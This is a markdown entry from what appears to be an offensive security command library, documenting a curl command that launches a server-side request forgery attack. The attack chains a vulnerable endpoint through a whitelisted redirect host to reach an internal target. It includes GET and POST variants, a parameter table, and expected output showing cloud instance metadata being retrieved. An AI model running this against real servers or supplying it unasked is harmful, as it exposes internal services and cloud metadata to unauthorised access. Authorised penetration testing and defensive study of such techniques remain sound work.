---
type: command
executor: bash
data: >-
  curl -X $_METHOD
  "http://vulnerable.com/index.php?url=http://$_WHITELISTED_HOST/redirect"
  $_DATA_FLAG -v
output: null
tags:
  - ssrf
  - web
  - bypass
platforms:
  - Linux
  - macOS
verified: true
validated: true
---

# curl-launch-ssrf-redirect

## Command

```bash
curl -X $_METHOD "http://vulnerable.com/index.php?url=http://$_WHITELISTED_HOST/redirect" $_DATA_FLAG -v
```

## Description

This command uses curl to send a request to a vulnerable SSRF endpoint, directing it to fetch a whitelisted redirect URL that chains to an internal target. It simulates launching the SSRF attack while preserving verbosity for debugging the request flow.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_METHOD | HTTP method (e.g., GET, POST) | Yes |
| $_WHITELISTED_HOST | IP or domain of the whitelisted redirect host | Yes |
| $_DATA_FLAG | Flag for POST data (e.g., -d "data=foo") | No (for GET) |
| -v | Verbose output to show headers and flow | Yes |

## Examples

### Basic Usage (GET Request)

```bash
curl -X GET "http://vulnerable.com/index.php?url=http://whitelisted.example.com/redirect" -v
```

### Advanced Usage (POST with Data)

```bash
curl -X POST "http://vulnerable.com/index.php?url=http://whitelisted.example.com/redirect" -d "key=value" -v
```

## Expected Output

Verbose curl output showing the request to vulnerable.com, followed by the server's fetch of the whitelisted host, the 307 redirect, and the final response from the internal target (e.g., HTTP/1.1 200 OK with internal resource content like JSON metadata).

Example snippet:

```
> GET /index.php?url=http://whitelisted.example.com/redirect HTTP/1.1
< HTTP/1.1 200 OK
{"instance-id": "i-1234567890abcdef0"}
```

## Related

- [[procedures/Server-Side-Request-Forgery-via-Redirect-Attack]]
- [[curl-basic-request]]
